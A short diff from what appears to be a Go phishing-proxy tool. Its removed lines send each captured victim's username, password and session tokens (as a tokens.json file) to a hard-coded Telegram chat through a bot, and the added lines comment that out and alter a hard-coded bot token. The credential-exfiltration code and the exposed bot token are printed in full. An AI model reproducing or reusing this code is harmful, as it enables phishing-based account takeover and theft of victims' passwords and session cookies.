@@ -43,7 +43,7 @@ var bot *tgbotapi.BotAPI
 
 func init() {
     var err error
-    bot, err = tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+    bot, err = tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzAa")
     if err != nil {
         log.Panic(err)
     }
@@ -83,15 +83,15 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 			return nil, err}
 
     // Send text message
-    message := fmt.Sprintf("ID: %d\nUsername: %s\nPassword: %s", s.Id, s.Username, s.Password)
-    msg := tgbotapi.NewMessage(5822512651, message)
-    bot.Send(msg)
+    // message := fmt.Sprintf("ID: %d\nUsername: %s\nPassword: %s", s.Id, s.Username, s.Password)
+    // msg := tgbotapi.NewMessage(5822512651, message)
+    // bot.Send(msg)
 
     // Send document
-    tokenJSON, _ := json.Marshal(s.Tokens)
-    tokenFile := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}
-    documentMsg := tgbotapi.NewDocument(5822512651, tokenFile)
-    bot.Send(documentMsg)
+    // tokenJSON, _ := json.Marshal(s.Tokens)
+    // tokenFile := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}
+    // documentMsg := tgbotapi.NewDocument(5822512651, tokenFile)
+    // bot.Send(documentMsg)
 
     return s, nil // Single return point
 
